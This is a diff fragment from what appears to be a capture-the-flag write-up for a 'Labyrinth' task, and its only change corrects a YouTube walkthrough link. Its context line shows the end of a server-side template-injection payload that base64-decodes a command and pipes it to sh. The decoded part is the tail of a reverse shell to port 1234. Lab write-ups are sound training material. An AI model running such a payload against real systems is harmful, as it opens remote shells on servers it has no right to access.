@@ -24,7 +24,7 @@ LjE4IDEyMzQgPi90bXAvZgo= | base64 -d | sh').read()}}
 ```
 ## Task: What is the Labyrinth flag?
 ### YouTube video walkthrough: 
-[YouTube video 2]([https://youtu.be/HdeJ_-U6RZI](https://youtu.be/yg4L-iKXrL4))
+[YouTube video 2](https://youtu.be/yg4L-iKXrL4)
 
 ### Coomand used on the video:
 
